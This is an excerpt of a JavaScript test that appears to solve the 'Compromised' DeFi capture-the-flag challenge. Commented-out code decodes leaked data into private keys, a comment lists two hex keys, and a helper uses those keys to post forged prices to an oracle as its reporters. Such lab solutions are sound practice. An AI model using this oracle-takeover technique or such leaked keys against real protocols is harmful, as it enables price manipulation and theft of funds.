...
describe('Compromised challenge', function () {
  ...
  it('Exploit', async function () {
    ...
    // let hexBuf = Buffer.from(input.replaceAll(' ', ''), 'hex')
    // let stringData = hexBuf.toString('utf8')
    // let base64Buf = Buffer.from(stringData, 'base64')
    // let privateKey = base64Buf.toString('ascii')
    // console.log('privateKey', privateKey)
    // 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
    ...
    const postPrice = async (price) => {
      ...
      const oracleOne = new ethers.Wallet(keys[0], ethers.provider)
      const oracleTwo = new ethers.Wallet(keys[1], ethers.provider)

      await this.oracle.connect(oracleOne).postPrice('DVNFT', price)
      await this.oracle.connect(oracleTwo).postPrice('DVNFT', price)
    }
